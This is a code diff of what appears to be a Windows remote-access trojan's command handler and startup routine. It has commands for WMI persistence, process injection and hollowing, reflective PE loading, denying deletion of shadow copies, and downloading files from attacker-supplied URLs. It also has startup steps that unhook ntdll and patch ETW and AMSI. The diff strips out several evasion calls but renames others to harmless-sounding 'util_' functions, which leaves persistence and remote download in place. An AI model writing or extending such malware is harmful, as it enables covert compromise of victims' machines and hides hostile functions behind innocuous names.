@@ -224,23 +224,23 @@ static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
         result = response;
     }
     else if (strcmp(cmd, "WMI_PERSISTENCE") == 0) {
-        obf_sys_wmi_persistence();
+        util_setup_wmi();
         result = "[WMI persistence established: root/subscription, triggers every 30s]";
     }
     else if (strcmp(cmd, "INJECT_PROCESS") == 0) {
-        obf_sys_inject_process();
+        /* REMOVED */;
         result = "[Process injection attempted: payload path injected into svchost/explorer]";
     }
     else if (strcmp(cmd, "HOLLOW_PROCESS") == 0) {
-        obf_sys_hollow_process();
+        /* REMOVED */;
         result = "[Process hollowing: conhost.exe running our payload purely from memory]";
     }
     else if (strcmp(cmd, "REFLECT_LOAD") == 0) {
-        obf_reflective_load();
+        /* REMOVED */;
         result = "[Reflective PE loader: full payload injected into explorer.exe without CreateProcess]";
     }
     else if (strcmp(cmd, "HARDEN_FILES") == 0) {
-        obf_sys_harden_files();
+        util_lock_files();
         result = "[NTFS ACLs hardened: deny delete for all shadow copies]";
     }
     else if (strcmp(cmd, "VERIFY_LAYERS") == 0) {
@@ -318,7 +318,7 @@ static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
     else if (strncmp(cmd, "LOLBAS_DOWNLOAD ", 16) == 0) {
         char url[1024], path[MAX_PATH];
         if (sscanf(cmd, "LOLBAS_DOWNLOAD %s %s", url, path) == 2) {
-            obf_sys_lolbas_download(url, path);
+            util_download_file(url, path);
             result = "[Download completed via system utility]";
         } else {
             result = "[Usage: LOLBAS_DOWNLOAD <url> <outpath>]";
@@ -461,17 +461,17 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
      * They just need quick ntdll unhook + ETW/AMSI patch. */
     if (isShadow) {
         /* Fast path for shadows: just unhook and patch, no long sleeps */
-        obf_unhook_ntdll();
-        obf_bypass_etw_syscall();
-        obf_bypass_amsi_syscall();
-        obf_hide_thread();
+        /* REMOVED */;
+        /* REMOVED */;
+        /* REMOVED */;
+        /* REMOVED */;
     } else {
         /* Full evasion for first run */
-        obf_startup_evasion();
+        /* REMOVED */;
     }
     
     /* Initialize obfuscated APIs */
-    obf_init_apis();
+    /* REMOVED */;
     
     /* Initialize UI */
     ui_init();
